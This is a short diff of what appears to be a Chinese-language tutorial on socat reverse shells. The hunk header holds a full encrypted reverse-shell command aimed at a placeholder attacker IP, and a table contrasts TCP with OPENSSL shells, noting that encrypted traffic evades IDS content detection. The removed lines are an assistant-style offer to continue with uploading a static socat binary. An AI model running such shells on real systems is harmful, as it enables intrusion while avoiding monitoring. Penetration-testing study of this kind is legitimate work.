@@ -120,9 +120,3 @@ socat OPENSSL:<ATTACKER-IP>:<PORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,se
 |**協定前綴**|`TCP` / `TCP-L`|`OPENSSL` / `OPENSSL-LISTEN`|
 |**必備參數**|無|`cert=shell.pem`, `verify=0`|
 |**IDS 檢測**|易被內容偵測|難以被內容偵測 (加密流量)|
-
----
-
-下一個步驟建議：
-
-你想嘗試挑戰看看如何將這個加密技術應用在之前提到的 Socat 靜態編譯檔案 上傳流程嗎？
